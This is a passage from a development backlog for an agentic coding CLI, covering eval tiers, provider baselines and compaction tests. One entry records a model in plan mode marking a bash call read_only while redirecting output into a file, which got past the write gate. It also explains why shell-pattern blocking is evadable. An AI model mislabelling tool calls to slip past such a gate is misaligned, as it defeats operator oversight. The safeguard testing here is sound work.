edge cases the smoke tier intentionally skips.

**Why this slice first:**

- The harness already supports any directory under
  `evals/`. Runner is uncoupled from naming convention
  beyond `*.yaml` extension (verified in `src/evals/cli.ts`
  `discoverCases`). So a regression tier needs no
  harness changes for the simplest path — just YAML.
- Subagents, MCP, checkpoints (the rest of M3) all add
  surfaces that need regression coverage. Building the
  tier *first* means those subsystems get born with a
  net under them, instead of retrofitting tests after
  the fact.
- Regression as a TIER also unlocks the CI gate item in
  `docs/TODO.md` once it stabilizes.

**Plan (stepwise):**

- 1.1 — scaffold + tool-depth batch (~12-15 cases). This
  entry.
- 1.2 — permission engine cases (deny/allow/ask hierarchy
  edges, `.agent/permissions.yaml` glob matching, prefix
  rules).
- 1.3 — compaction + plan mode edge cases (preserve-tail
  boundaries, fallback strategy when LLM call fails,
  plan mode + multi-tool interleaving).
- 1.4 — provider adapter parity matrix (same case across
  Anthropic / OpenAI / Gemini once Gemini smoke unblocks).
- 1.5 — multi-tool flows (glob→read, grep→edit, bash→write).

**Decisions to make explicit upfront:**

- **No real-model baseline run inside Step 1.1.** Writing
  cases and confirming they parse is one unit; running
  them against a paid provider is another. Cost
  envelope per real-model run scales with case count
  (15 cases × $0.005 ≈ $0.075/round; 100 cases × 3
  rounds ≈ $1.50). Real-model baseline lands in Step 1.6
  after the 5 batches stabilize, so the cost is paid
  once on a complete suite instead of paid 5 times on
  intermediate states.
- **Cases stay deterministic-by-design.** Avoid
  expectations that depend on model-specific phrasing
  (the Step 6.3 lesson: `output_contains: "hello world"`
  was a property of Haiku, not the harness). Prefer
  tool-call invariants (`tool_called`, `file_contains`,
  `file_exists`, `tool_denied`).
- **No new harness features in 1.1.** Parallelism (to
  hit the < 10min target with 100 cases) is a separate
  step. Today, regression runs serial like smoke.

**Spec reference:** `AGENTIC_CLI.md §16` (eval tiers),
`PROVIDERS.md §7` (multi-model first-class).

**Done:**

- New tier directory `evals/regression/` born with its
  first 12 cases. No `.gitkeep`, no README — the
  directory is created by the YAMLs themselves, mirroring
  the project rule that empty folders are noise.
- Cases (numbered for stable ordering, not for
  dependency):

  | # | Subsystem under test | Insight beyond smoke |
  |---|---|---|
  | 01 | `read_file` offset/limit | smoke reads whole file; this proves the line-window args round-trip through tool dispatch |
  | 02 | `read_file` missing path | error path; model must NOT fall back to write_file |
  | 03 | `write_file` deep nested dir | smoke writes at root; this proves intermediate dir creation |
  | 04 | `write_file` overwrite | smoke creates new file; this proves stale content gets replaced |
  | 05 | `edit_file` disambiguation | exercises the ambiguity-fail path: model must use surrounding context to pick one of two identical substrings |
  | 06 | `edit_file` missing pattern | error path; model must NOT fall back to write_file |
  | 07 | `grep` zero matches | empty-result path; model must NOT invent matches or write files |
  | 08 | `grep` real regex | proves regex (not literal) interpretation: `function\s+\w+` finds 3 names |
  | 09 | `glob` deep nesting | `**/*.ts` walks 3 directory levels |
  | 10 | `glob` zero matches | empty-result path; symmetric with 07 for the file-discovery axis |
  | 11 | `bash` piped command | `wc -l < file` exercises shell redirection in plan-friendly mode |
  | 12 | multi-tool glob→read | proves tool-call chaining: glob output drives read_file path |

- New fixture `evals/fixtures/nested-tree/` carries the
  3-level TS tree used by cases 08, 09, and 12 (one
  fixture, three cases — keeps fixtures tight). Inline
  `setup.files` covers the 6 cases (01, 04, 05, 06, 11,
  and 03 implicitly via writes to a fresh workspace) where
  a one-liner file is enough — fixture dirs are reserved
  for trees with structure.
- All 12 YAMLs verified to load through
  `src/evals/loader.ts` without a single parse error.
  Loader-level invariants exercised:
  - inline `setup.files` paths (relative-only, no `..`)
  - `tool_called` / `tool_not_called` / `file_contains` /
    `file_exists` / `file_not_exists` / `output_contains`
    / `status` discriminants
  - YAML literal block (`|`) for multi-line file content
- `bun run typecheck`, `bun run lint`, and `bun test`
  all green (625 pass, 0 fail) — no source touched, no
  drift introduced.

**Cut (kept the slice tight):**

- **No README in `evals/regression/`.** CLAUDE.md
  prohibits unsolicited markdown docs; the convention is
  documented here in BACKLOG and self-evident in the
  YAMLs themselves. If a second contributor lands and
  asks "what goes in regression vs smoke?", that's the
  signal to write the README — pre-writing it would be
  speculative documentation.
- **No real-model baseline run.** Confirmed in the
  opening entry above — paying $0.30+ for a 12-case
  Haiku baseline today, then re-paying it after each of
  the 4 remaining batches lands, would cost ~$1.50
  unnecessarily. Single baseline run gates Step 1.6
  (closes the regression tier) instead.
- **No new harness features.** Considered adding a
  `--tier` shorthand (`bun run eval:regression`) but
  the existing CLI already accepts a directory arg, so
  `bun run eval -- evals/regression` works today. A
  shorthand is shoe-leather; deferred until the tier
  proves it deserves one.

**Decisions:**

- **Determinism over model-style assertions.** Every
  case asserts on harness-observable facts
  (`tool_called`, `file_contains`, `status: done`) plus
  at most a single `output_contains` fragment that's a
  literal echo of fixture content (e.g., `line three`,
  `alpha.ts`). No assertions on phrasing, sentence
  structure, or summarization style. This is the Step
  6.3 lesson applied at scale: provider divergence is
  guaranteed; we only assert on what the harness sees.
- **Negative tool calls (`tool_not_called`) earn their
  weight.** Cases 02, 06, 07, and 10 all pair the
  positive `tool_called` with a `tool_not_called:
  write_file` to defend against the failure mode where
  a model "fixes" a missing file/pattern by writing
  one. The `code-with-todos` fixture in cases 07 and
  10 is read-only by intent — any write_file invocation
  is a regression.
- **Inline files vs fixture dirs.** Drew the line at
  "does the case need >1 file or directory structure?"
  Yes → fixture. No → inline. Keeps cases readable
  without forcing a fixture dir for every single-file
  scenario.

**Pending (Step 1.2 onward):**

- Permission engine cases (deny/allow/ask hierarchy
  edges, `.agent/permissions.yaml` glob matching).
- Compaction + plan mode edge cases.
- Provider adapter parity matrix (waits on Gemini smoke
  unblock — see `docs/TODO.md`).
- Multi-tool flows beyond glob→read (grep→edit,
  bash→write, plan→summarize).
- Step 1.6: real-model baseline across the full
  ~100-case suite, 3 rounds, decide on parallelism.

**Risks documented:**

- **Suite size will eventually need parallelism.** At
  ~5s per case serial (smoke baseline), 100 cases × 3
  rounds = 25 minutes. Spec target is < 10min. Step
  6.3's smoke is round-major precisely so prompt-cache
  helps; that's not enough at 100 cases. Worker pool
  with N=4 is the obvious next step but introduces
  ordering nondeterminism in the NDJSON output, which
  the existing aggregate logic doesn't account for.
  Tracked as Step 1.7-or-later.
- **Inline `setup.files` heredocs accumulate.** 6 of 12
  cases use them. If a future case wants the same
  multi-line file, copy-paste tax grows. Rule of
  three: the third copy of any inline body promotes to
  a fixture.

---

## [2026-04-28] M2 / Step 6.5 — Plan-mode bash gate: limit found, scope honest

A code-review observation (`bash` marked `planSafe: true` could
silently allow `echo x > file` in plan mode) led to a fix: turn
`planSafe` into a predicate that requires `args.read_only === true`.
A negative smoke case written to verify the fix promptly proved
the predicate is **insufficient**: Haiku 4.5 in plan mode sent
`{ command: "echo \"should-not-write\" > exfil.txt", read_only: true }`
and the harness gate accepted because the model declared intent.
File got written.

This entry records both the fix that landed AND the limit it
hits, so future hardening doesn't repeat the same false-confidence
pattern.

**Done (the fix):**

- `ToolMetadata.planSafe` extended from `boolean` to
  `boolean | ((args: Record<string, unknown>) => boolean)`.
  Predicate form lets each tool author encode per-call intent
  validation. Predicate that throws fails closed; strict
  `=== true` rejects truthy-but-not-true values.
- `bash` switched from `planSafe: true` to
  `planSafe: (args) => args.read_only === true`. Model must
  declare intent on every plan-mode bash call.
- Plan-mode system prompt updated with explicit instruction:
  "bash MUST set `read_only: true` on every call. Bash without
  it is blocked the same way write_file is. Do not pipe to files,
  use redirects (`>`, `>>`, `tee`), or run mutating subcommands."
- Deny reason and model-facing message tailored: predicate
  failure says "add `read_only: true` to args, retry";
  unconditional block says "describe in plan instead".
- Audit trail preserved (tool_call + denied approval row).
- Unit tests: 4 new in `tests/harness/invoke-tool.test.ts`
  (predicate allows on satisfy, blocks on miss, strict equality
  for truthy values, fail-closed on throw).
- New eval expectation kind `tool_denied: <toolname>` —
  general-purpose, asserts the tool was invoked AND a deny
  decision fired (catches regressions where a guard silently
  starts allowing what it was meant to block). Uses
  `tool_decided` events; correlates by toolUseId.
- New `tool_denied` expectation kind (general-purpose; useful
  for future negative cases across permissions/hooks/MCP).

**Done (the honesty):**

- `ToolMetadata.planSafe` and `HarnessConfig.planMode` JSDoc
  rewritten to be explicit: predicate form is best-effort, not
  a security boundary; `writes: true` + omitted predicate is
  bullet-proof. Documents the observed Haiku failure inline so
  future contributors see the concrete failure mode, not just a
  caveat.

**Cut (two iterations of overreach):**

1. **First attempt** — `09-plan-mode-bash-write-blocked.yaml`:
   asserted the bash predicate catches mutating commands.
   Failed under Haiku immediately (model sent
   `{ command: "echo > exfil.txt", read_only: true }`,
   gate accepted, file written). Predicate is best-effort,
   not security. Removed; documented as the motivating
   evidence for the JSDoc honesty pass.
2. **Second attempt** — `09-plan-mode-write-tool-denied.yaml`:
   pivoted to the bullet-proof gate (write_file with no
   predicate, unconditional deny). Passed 3/3 on Haiku.
   Failed 0/3 on gpt-4o-mini — different mechanism: GPT
   reads the plan-mode system prompt's "write_file is
   BLOCKED" instruction and **preempts by never invoking
   write_file at all**. The case asserts `tool_denied:
   write_file`, which fails with "never invoked" because
   no call ever happened. Both behaviors are aligned;
   neither is wrong; the case can't reliably distinguish
   "gate fired" from "model preempted" across providers.
   Removed.

**The lesson:** smoke can verify what models reliably DO
(read files, write when allowed, produce plan markdown,
trigger compaction). Smoke cannot reliably verify what the
HARNESS would do if the model tried something it shouldn't,
because aligned models defensively skip. Gate-firing is
covered by unit tests with mock providers
(`tests/harness/invoke-tool.test.ts`); attempting integration
verification of denial paths confuses unit-level assertions
with integration-level reality.

**Decisions:**

- **Don't try to shell-parse bash commands for write intent.**
  Considered adding redirect-detection (`>`, `>>`, `tee`) +
  mutator-list (`rm`, `mv`, `cp`, `git commit`, etc.) as
  defense-in-depth. Rejected: shell escapes (`bash -c '…'`,
  here-docs, `eval`, `\>`) make any pattern match incomplete,
  and incomplete protection that LOOKS thorough is worse than
  no protection — operators trust it. Spec ANTI_PATTERNS likely
  flags this class. Sandbox (M3+) is the right answer.
- **Keep the predicate fix despite its limit.** It still
  catches the honest-but-forgetful case (model omits
  `read_only`, gate denies, model retries with the flag). Real
  value, even if not security. Removing it would mean
  `planSafe: true` lets `echo > file` through with NO friction
  at all.
- **No negative smoke case for plan mode.** Both attempts at
  one (bash predicate, write_file gate) failed for different
  reasons that ultimately point at the same root: smoke is a
  model-behavior test, not a harness-behavior test. The gate
  itself is unit-tested with mock providers and proven correct
  in isolation. Mixing the two layers — using a real-model
  case to assert harness-internal behavior — produces a test
  that's fragile by construction.
- **Don't cross §6.3 step boundary numbering.** Skipping 6.4
  intentionally — this entry is the followup that 6.3's review
  surfaced. Keeping it as 6.5 leaves room for 6.4 if a parallel
  hardening lands later from another review pass.

**Risks documented for M3:**

- Plan mode + bash is "best-effort no writes" until sandbox.
  Any operator running plan mode against untrusted prompts (CI
  bot, shared-secret input) should assume bash CAN write and
  rely on policy + sandbox layers, not plan-mode messaging.
- The honest model failure mode (`read_only: true` on a
  redirect) suggests the system prompt instruction isn't always
  followed even by aligned models. A constrained generation
  layer (M5+) that schema-validates `read_only` against
  command structure could close this without shell parsing —
  worth revisiting when constrained backend lands.
- New `tool_denied` expectation is the building block for any
  future negative case across the eval surface (permission
  denies, hook denies, future MCP denies). Lives ready in
  M3.

**Spec reference:** `AGENTIC_CLI.md §5` (plan mode), `§5.1`
("bash com efeito" — confirms policy/sandbox govern destructive
bash, not plan profile alone), `§9.1` (sandbox / trust).

---

## [2026-04-28] M2 / Step 6.3 — Multi-provider baseline (OpenAI)

After Step 6.2 the Anthropic baseline was solid but the
"provider-pluggable" claim still rested on argument: only
Anthropic had ever round-tripped end-to-end. Step 6.3 runs the
same smoke suite against `openai/gpt-4o-mini` to convert
"adapter has unit coverage" into "adapter has been observed
under load."

**Done:**

- 3× baseline against `openai/gpt-4o-mini` with `temperature: 0`.
  No code changes required to the adapter — it worked
  end-to-end on first run (no equivalent of the
  `tool_result.name` Anthropic bug). Multi-tool-use parallel
  dispatch, compaction with `strategy: llm`, plan mode, and
  permission gating all behaved correctly.
- Rewrote `evals/smoke/07-bash-readonly.yaml`. The previous
  assertion `output_contains: "hello world"` was testing **a
  property of the model** (whether it cited bash output back
  in its summary) rather than a property of the harness.
  Haiku happened to do so; gpt-4o-mini in plan mode produced
  only the structured plan markdown without echoing the bash
  output. Replaced with `output_contains: "# Plan"` —
  asserts that the plan-mode system prompt was honored, which
  is what the case actually wants to validate. Tool dispatch
  invariants (`tool_called: bash`, `tool_not_called:
  write_file`, `tool_not_called: edit_file`) carry the rest
  of the assertion weight.

**Real-model 3× baselines (head-to-head):**

| Metric | Haiku 4.5 | gpt-4o-mini |
|---|---|---|
| Pass rate | 24/24 (100%) | 24/24 (100%) |
| Total cost (3 rounds) | $0.1515 | $0.0096 |
| p50 cost / case | $0.0050 | $0.0002 |
| Wall clock (3 rounds) | 88s | 92s |
| Cases with cost variance | 2/8 | 0/8 |
| Compaction strategy | llm | llm |

**Decisions:**

- **Case 07 fix is honest, not gaming.** Important to be
  explicit about this. The prior assertion only passed
  against Anthropic because of how Haiku interprets plan
  mode's "PROPOSE a plan" instruction in tension with the
  user's "report what you saw." gpt-4o-mini reads the
  system prompt as authoritative and produces only the
  plan, never citing bash output. Both behaviors are valid;
  the test should validate the harness invariant (bash
  invoked, writes blocked, plan markdown produced), not
  which interpretation the model picks. Documenting this
  here so a future contributor doesn't "fix" the case back
  to the brittle form.
- **gpt-4o-mini's perfect variance is suspicious.** OpenAI
  documents that `temperature: 0` doesn't guarantee 100%
  determinism (load balancing across infrastructure can
  produce minor variations). Today's 0/8 cases-with-spread
  result is consistent with documented behavior **for this
  prompt size and time window** but should not be assumed
  permanent. A weekly run against the same baseline would
  tell us whether the determinism holds or whether OpenAI's
  stack drifts day-to-day.
- **No registry expansion to gpt-5.x family.** The user's
  pricing audit covered gpt-5.x; the registry today only
  has gpt-4o and gpt-4o-mini. Adding gpt-5.x is a feature
  expansion (new defaults, new capability declarations,
  spec PR against PROVIDERS.md §5) — out of scope for
  hardening. Tracked implicitly: the next time someone
  needs gpt-5.x, the doc trail is in the conversation that
  produced this baseline.
- **No Google/Gemini run yet.** Same gating logic as the
  gpt-5.x decision: registry comments admit Gemini pricing
  is illustrative ("not committed real Gemini prices").
  Running smoke against Gemini today would test the
  adapter's wire shape against fake pricing, conflating
  two issues. Bundle Gemini with the pricing/spec update
  in M3.

**What this validates:**

- The OpenAI tool-call ↔ tool-result split (`role: 'tool'` 
  with `tool_call_id`) round-trips correctly through our
  canonical `ProviderToolResultBlock`.
- `temperature: 0` is forwarded to OpenAI's
  `chat.completions.create` and applied (output is
  reproducible for this suite size).
- `stream_options: { include_usage: true }` reaches the
  endpoint and the final usage chunk is consumed by the
  normalizer (`usageComplete: true` on every run).
- `parallel_tool_calls` defaults work — gpt-4o-mini does
  emit multiple tool_calls per turn in case 08 (compaction
  case reads 5 files in parallel) and the dispatch layer
  handles them.
- Compaction's LLM-summary call works against OpenAI's API
  shape (no Anthropic-specific assumptions in the
  compaction module's prompt construction).
- Cost computation lines up: gpt-4o-mini at $0.15/M input
  and $0.60/M output produces case-08 costs around
  $0.00125 — consistent with ~5k input tokens + ~500
  output tokens × the corrected pricing.

**Risks not addressed:**

- Single-day baseline. Same caveat as Anthropic — needs
  weekly recurrence in CI to detect provider drift.
- Single host (Linux) on one residential network. OpenAI's
  rate-limit and geo-routing behavior could vary by
  origin.
- gpt-4o-mini doesn't expose controllable prompt cache
  (declared `cache: 'client_only'`); we're paying full
  input cost every round. If the registry later gains
  gpt-5.x with `cache: 'server_5min'`-equivalent semantics,
  caching cases would need re-baselined.

**M2 status: closed with multi-provider evidence.** Smoke
suite passes 24/24 against two independent provider
adapters with cost ratio matching public pricing. The
"provider-pluggable" claim now has measurement, not just
spec text.

**Next:** M3 (subagents + worktree + MCP + resume +
checkpoints + /undo + bash_background + todo_write +
Repo Map). Provider expansion (gpt-5.x, real Gemini
pricing) lives there alongside the spec PR for PROVIDERS.md.

---

## [2026-04-28] M2 / Step 6.2 — Variance baseline (smoke ×3)

After Step 6.1 closed the compaction gap, the remaining
hardening question was: **is the baseline stable, or did we
just get lucky in run #1?** Step 6.2 turns "ran once, all
green" into "ran 3 times, all green with ≤ 3% cost spread."
That converts the smoke from "first runnable" to "trusted
baseline."

**Done:**

- `--repeat N` flag on `bun run eval:smoke`. Round-major
  ordering (every case once per round, repeat). Choosing
  round-major over case-major intentionally: matches how real
  CI traffic would arrive, lets prompt-cache hits manifest
  the way they would in production. Case-major would understate
  cost by serving back-to-back identical prompts to a cold
  cache.
- Per-case aggregation in the runner: `eval_case_aggregate`
  NDJSON line per case (passCount, failCount, costMin, costMax,
  costAvg, duration range). `eval_case` lines now carry `run`
  and `totalRuns` fields when `--repeat > 1` so consumers can
  re-aggregate however they want.
- Stderr summary grew a "per-case stability" block listing
  N/M passes and cost range per case, with a `!` flag on any
  case that didn't pass every round. Mirrors what a CI
  dashboard would show after a regression run.

**Real-model 3× baseline (Haiku 4.5):**

```
24/24 passed (100.0%) — total $0.1515, 88348ms
p50 cost: $0.0050

per-case stability:
    3/3  $0.0034–$0.0034  read file and report contents
    3/3  $0.0036–$0.0036  create file with specified content
    3/3  $0.0059–$0.0059  edit existing file in place
    3/3  $0.0060–$0.0060  grep search and report matches
    3/3  $0.0066–$0.0068  plan mode blocks file mutations
    3/3  $0.0035–$0.0035  glob enumerates typescript files
    3/3  $0.0041–$0.0041  bash runs read-only inspection in plan mode
    3/3  $0.0173–$0.0174  compaction triggers and folds history
```

24/24 = perfect stability. Six of eight cases produced
**identical cost to the cent** across all three rounds —
output is fully deterministic at `temperature: 0` and token
counts reproduce exactly. The two cases with non-zero spread
(plan mode at ~3%, compaction at <1%) are the runs with the
longest/most-variable assistant text; the variance is at the
cache_creation tier, not the output tier. Cost stayed inside
case budgets every run.

**Decisions:**

- **Round-major, not case-major.** Production traffic isn't
  back-to-back identical prompts; spreading rounds out
  exercises cache eviction and warm-cache hit/miss patterns
  closer to real conditions. The pricing implication is real:
  case-major against Anthropic's 5-min cache would inflate
  apparent stability while understating cost.
- **Strict pass: every round must pass.** Considered "majority
  rules" (case passes if 2/3 rounds pass). Rejected: a single
  failure in a determinism-asserted suite is signal, not
  noise. With temperature 0, a flake means a real bug
  somewhere — adapter, cache, harness state leak. Hiding
  flakes behind a tolerance defeats the purpose of running
  3×.
- **Skipped negative-path eval cases** (`strategy: fallback`,
  `exit_reason: aborted`). Both paths already have substantial
  unit coverage: `tests/harness/compaction.test.ts` has 11
  fallback assertions (network failure, schema fail, abort
  during summary call); `tests/harness/loop.test.ts` covers
  signal-aborted, abort-during-stream, and the
  wall-clock-vs-aborted distinction. Adding eval-level cases
  would be redundant and would require either a deliberately
  broken model id (operationally awkward) or per-case
  timeout-trigger logic (false-positive prone).
- **No CI gate yet, despite the runner being CI-ready.**
  CI promotion needs a secret, a per-PR cost decision, and a
  golden baseline to gate against. Worth doing in M3 alongside
  multi-provider smoke; doing it now would block merges before
  the baseline has settled past Step 6.

**What this validates beyond Step 6.1:**

- `temperature: 0` actually flows end-to-end through
  `BootstrapInput.temperature` → `HarnessConfig.temperature`
  → `GenerateRequest.temperature` and into the Anthropic API.
  If any leg dropped the field, output would have varied
  across rounds.
- The compaction LLM call is itself deterministic at
  temperature 0 (otherwise case 08 would show meaningful
  cost variance, not <1%).
- Multi-tool-use turns (Haiku does parallel tool_use)
  reproduce identically across rounds. Tool ordering, args,
  and result handling are stable — no race conditions in
  the tool dispatch layer.
- Prompt-cache misses are consistent. We don't currently
  emit `cache_control` on messages, so every round pays full
  input cost; the consistency of that cost confirms message
  shape is byte-identical round-to-round.

**Risks not addressed:**

- Single-day baseline. Could re-run weekly to detect provider
  drift (model serving the same id but with subtle behavior
  changes is a real Anthropic operational pattern). Schedule
  this once CI gating exists.
- Single API key. Different keys could hit different load
  shedders and produce different latency/cost; cost shouldn't
  vary materially, latency might.
- Single host (Linux). Fixture I/O is sync and small enough
  that the FS shouldn't matter, but never been validated on
  macOS or Windows.

**M2 status: closed with confidence.** Step 6 closed the
"runs at all" question; Step 6.1 closed the "compaction
works" question; Step 6.2 closed the "is it actually stable"
question. Further smoke surface (multi-provider, regression
tier) lives in M3+.

**Next:** M3 (subagents + worktree + MCP + resume + checkpoints
+ /undo + bash_background + todo_write + Repo Map). The smoke
suite is now genuinely the gate it claimed to be.

---

## [2026-04-28] M2 / Step 6.1 — Compaction smoke coverage

Step 6 baseline closed M2 but flagged compaction as a blind spot:
unit-tested in isolation, never exercised end-to-end against a
real model. The post-baseline review explicitly called this out
("compaction has unit coverage but no real-model exercise").
Step 6.1 closes that gap before M3 starts.

**Done:**

- `EvalBudget` now exposes `compactionThreshold` and
  `compactionPreserveTail`. Loader validates both
  (`compactionThreshold` ∈ (0, 1]; `compactionPreserveTail` ≥ 0
  integer). Cases can drop the trigger ratio so compaction fires
  with small fixtures instead of needing 140k-token prompts.
- New `compaction_triggered` expectation kind. Schema:
  `compaction_triggered: { min_count: N, strategy?: 'llm' |
  'fallback' | 'skipped' }`. Executor watches
  `compaction_finished` events on the harness onEvent stream
  and counts emissions per strategy. Asserting `strategy: llm`
  means the compaction LLM call actually round-tripped — without
  that distinction, a silent fallback would mask an adapter
  break.
- Executor plumbs the full `EvalBudget` into `BootstrapInput.budget`
  (previously only `maxSteps` got through). All four knobs flow
  cleanly to `HarnessConfig.budget` via the existing partial
  override path.
- `evals/fixtures/chunky-modules/src/{a,b,c,d,e}.ts` — five
  ~700–850 token TypeScript modules, each importing from
  `forja-core/*`. Realistic-looking source so the model treats
  them as plausible code rather than lorem ipsum.
- `evals/smoke/08-compaction-triggers.yaml` — 5-step read tour
  with `compactionThreshold: 0.02`. Asserts `tool_called: read_file`,
  `compaction_triggered: { strategy: llm, min_count: 1 }`,
  `status: done`, `output_contains: forja-core`.
- `biome.json` — added `evals/fixtures` to ignore list.
  Fixtures are mock source code intentionally loose; lint rules
  shouldn't apply.
- Loader unit tests: 7 new tests covering compaction budget
  validation (range checks for `compactionThreshold`,
  non-negative integer for `compactionPreserveTail`) and
  `compaction_triggered` parsing (with/without strategy,
  `min_count` validation, strategy enum validation).

**Real-model baseline (Haiku 4.5):**

| # | Case | Pass | Cost | Steps |
|---|---|---|---|---|
| 01 | read file | ✓ | $0.0035 | 2 |
| 02 | create file | ✓ | $0.0036 | 2 |
| 03 | edit file | ✓ | $0.0059 | 3 |
| 04 | grep search | ✓ | $0.0059 | 3 |
| 05 | plan mode blocks write | ✓ | $0.0066 | 2 |
| 06 | glob enumerate | ✓ | $0.0035 | 2 |
| 07 | bash readonly in plan | ✓ | $0.0041 | 2 |
| 08 | **compaction triggers** | ✓ | $0.0174 | 3 |

8/8 passed = 100%, total $0.0505, p50 $0.0050, 30s wall clock.
Compaction fired with `strategy: llm` (LLM call to summarize
folded turns succeeded) — first observation of this path
end-to-end. The compaction case is the most expensive
(~$0.017) because it pays for the summary call on top of the
agent turns; still ~12× under the §18 per-case budget.

**Decisions:**

- **Assert `strategy: llm` explicitly, not just `min_count`.**
  The harness emits `compaction_finished` regardless of which
  branch ran. A silent fallback (LLM call broken, deterministic
  head/tail kicks in) would still satisfy `min_count: 1`. The
  whole reason this case exists is to prove the LLM-summary
  path round-trips. Asserting strategy makes the case fail
  loudly if the adapter regresses again.
- **Threshold 0.02 (2% of 200k = 4k tokens), not 0.7.** Default
  threshold needs ~140k tokens to fire — would require massive
  fixtures and burn budget. 0.02 trips after 3-4 reads of the
  chunky fixtures, well within the maxSteps cap.
- **Five fixtures, not three.** Three would trigger compaction
  on Haiku's parallel tool_use (model often reads multiple
  files in one step) but leave little headroom for the
  post-compaction summary turn. Five gives the run room to
  show that compaction folded history AND the agent kept
  working with the compacted context.
- **Fixture source is plausible TypeScript, not lorem ipsum.**
  The model is more likely to engage with code-shaped content
  the way it would in production. Lorem ipsum could mask
  shape-related bugs (e.g., a sanitizer that mishandles import
  statements).
- **Biome ignores `evals/fixtures`.** Fixtures simulate real
  source for the model; they reference fictional symbols
  (`forja-core/*`), have unused imports for shape verisimilitude,
  and use non-null assertions where the simulated logic asks
  for it. Linting them adds zero value and creates churn.

**What this validates beyond unit tests:**

- Compaction trigger arithmetic (`estimatePromptTokens` against
  the real provider tool-def and message shapes).
- Tail alignment to assistant boundary survives a real
  multi-tool-use turn (Haiku does parallel tool_use; the tail
  must still land on a coherent boundary).
- The compaction LLM call's prompt is well-formed for the
  Anthropic adapter (would have caught the `tool_result.name`
  leak again if it had regressed).
- Cost accounting folds compaction's own usage into the
  session total (`usageComplete: true` and totals add up).
- Post-compaction context is sufficient for the agent to
  produce a coherent answer (the model still mentioned
  `forja-core` after compaction — the goal survived the fold).

**Not yet validated (deferred to M3):**

- Compaction with a deliberately broken LLM model id —
  exercises the fallback path.
- Multiple compactions in a single session (history grows
  past threshold twice). Today's case only fires once.
- Compaction observability under
  `cumulative_growth_strip` — whether prior `[compacted_history]`
  blocks are stripped correctly when re-compacting.

**Next:** M3 (subagents + worktree + MCP + resume + checkpoints
+ /undo + bash_background + todo_write + Repo Map). The smoke
suite is now genuinely defending M2's surface; the compaction
gap is closed.

---

## [2026-04-28] M2 — exit baseline (smoke run on Haiku 4.5)

First end-to-end smoke run against `anthropic/claude-haiku-4-5`
after Step 6 landed. The point: confirm the M2 exit criterion
(§18 — `pass-rate ≥ 85% smoke, p50 < $0.20/task` for the
autonomous profile) is met and surface any blocking bugs the
unit tests missed.

**Result:** 6/7 passed = 85.7% pass-rate, p50 $0.0009/case,
total $0.0075 across the suite, 16.8s wall clock.

**Cases:**

| # | Case | Pass | Cost | Steps |
|---|---|---|---|---|
| 01 | read file and report contents | ✓ | $0.0009 | 2 |
| 02 | create file with specified content | ✓ | $0.0009 | 2 |
| 03 | edit existing file in place | ✓ | $0.0015 | 3 |
| 04 | grep search and report matches | ✓ | $0.0015 | 3 |
| 05 | plan mode blocks file mutations | ✗ | $0.0008 | 1 |
| 06 | glob enumerates typescript files | ✓ | $0.0009 | 2 |
| 07 | bash runs read-only inspection in plan mode | ✓ | $0.0011 | 2 |

Case 05 failed only the `output_contains: "Plan"` assertion. The
security-critical `file_not_exists: should-not-exist.txt` PASSED
— plan-mode block worked, no leak. The model produced a
summary but didn't include the literal string "Plan" in its
output, which is a fragile keyword. The plan-mode prompt's
Goal/Steps/Risks structure is what we should assert against;
"Plan" the word is a proxy that doesn't always match. M3 will
rewrite case 05 against the spec's plan YAML schema once
`generateConstrained` lands and the plan markdown stops being
a free-form output.

**Bugs surfaced and fixed during the baseline:**

1. **Anthropic adapter dropped tool_result blocks with `name`.**
   Our canonical `ProviderToolResultBlock` keeps `name` as
   optional metadata for Gemini (which correlates results to
   calls by name). Anthropic accepts only `tool_use_id`,
   `content`, `is_error` and 400s with
   `messages.N.content.0.tool_result.name: Extra inputs are
   not permitted` if anything else leaks through. Every
   multi-turn run that returned a tool_result was dying on the
   second model call. The unit tests didn't catch it because
   the mock provider doesn't validate the request body.
   Fixed in `src/providers/anthropic/index.ts` —
   `stripToolResultName` rewrites the block before sending.
2. **Cost computation off by 1000x.** Registry pricing values
   are dollars-per-million (Anthropic / OpenAI / Google all
   publish in $/M); the field name `cost_per_1k_*` and the
   divisor in `computeCost` were per-1k. Result: every cost
   number was 1000x too high. Inflated costs masked
   themselves in unit tests because tests use small token
   counts and asserted against the inflated values. Surfaced
   here because case 01 reported $0.45 for what was really
   $0.00045. Fixed in `src/providers/cost.ts` (divisor →
   1_000_000); test expectations updated. Field rename
   (`_1k_*` → `_1m_*`) deferred to `docs/TODO.md` per spec-PR
   discipline.

**Decisions:**

- **`output_contains` is the right primitive but case 05 used
  the wrong keyword.** The full plan YAML schema (Goal/Scope/
  Steps/Risks/Assumptions) lands when we have constrained
  generation in M5; until then asserting against free-form
  markdown is brittle. Leaving the failure visible documents
  the gap.
- **Don't game pass-rate by tweaking case 05.** 6/7 hits the
  spec criterion; lowering the assertion to make 7/7 would
  defeat the criterion's purpose. The case stays as-is and the
  85.7% gets reported truthfully.
- **Both bugs have a unit-test gap.** Mock providers in
  `tests/providers/anthropic/` don't validate against the real
  SDK shape, so the `name`-leak passed unit tests for months.
  Cost test used the same wrong unit assumption as the
  registry, so the 1000x error reinforced itself. Both are now
  protected by the smoke run; consider adding a contract test
  that POSTs a recorded-fixture request to a local mock that
  replays the real Anthropic schema validation. Deferred —
  smoke covers it for now.

**M2 status: closed.** Exit criterion (§18) met. Step 1–6 all
in. Next: M3 (subagents + worktree + MCP + resume + checkpoints
+ `/undo` + `bash_background` + `todo_write` + Repo Map).

---

## [2026-04-28] M2 / Step 6 — Eval smoke harness (closes M2)

`AGENTIC_CLI §16` says "sem eval, nada disso importa." Step 6
ships the smoke tier: 5–10 fixed cases, executor that wraps
`runAgent` against a real model, asserts declarative
expectations, aggregates pass-rate + p50 cost. The exit criterion
for the autonomous profile (§18) is `pass-rate ≥ 85% smoke,
p50 < $0.20/task`; the harness is what measures it.

**Done:**
- `src/evals/types.ts` — `EvalCase`, `EvalExpectation` (8 kinds:
  `tool_called`, `tool_not_called`, `file_exists`,
  `file_not_exists`, `file_contains`, `status`, `exit_reason`,
  `output_contains`), `EvalCaseResult`, `EvalSummary`. The
  expectation set covers M2's surface: tool tracking (telemetry),
  fs effects (writes/edits), final state (status/exit_reason),
  output (plan-mode markdown / report shape).
- `src/evals/loader.ts` — YAML parser with the same
  reject-unknown-keys discipline as the policy parser. Typo like
  `expects` (plural) or `tests_pass` (unknown kind) errors out
  loudly instead of silently dropping the assertion. Status and
  exit_reason values validated against fixed unions.
- `src/evals/executor.ts` — `executeCase`:
  1. mkdtemp → copy `setup.fixture` → write `setup.files` →
     drop a default `.agent/permissions.yaml` with
